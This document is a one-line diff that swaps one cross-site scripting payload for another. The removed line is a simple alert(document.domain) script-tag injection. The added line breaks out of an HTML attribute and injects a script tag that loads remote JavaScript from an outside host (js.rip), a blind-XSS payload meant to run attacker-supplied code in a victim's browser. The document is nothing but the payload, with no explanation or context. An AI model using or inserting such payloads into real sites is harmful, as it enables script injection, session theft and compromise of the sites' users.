@@ -1,1 +1,1 @@
-</script><script src='alert(document.domain);'></script>
+"><script src="https://js.rip/bpgkz7tbke"></script>
